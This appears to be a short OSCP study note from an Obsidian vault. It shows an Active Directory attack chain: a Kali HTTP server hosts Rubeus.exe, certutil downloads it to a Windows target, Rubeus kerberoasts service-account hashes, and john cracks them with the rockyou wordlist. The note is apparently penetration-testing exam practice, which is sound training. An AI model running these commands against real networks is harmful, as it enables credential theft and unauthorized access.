```
python -m http.server 80 --directory ~/Desktop/Tools/Windows
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}:80/Rubeus.exe Rubeus.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
Dot Source
```powershell
. .\Rubeus.exe
```

Kerberoasting
```
.\Rubeus.exe kerberoast /outfile:kerberoast.hashes
```

```
echo '[hash]' > hash.txt
```

```
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```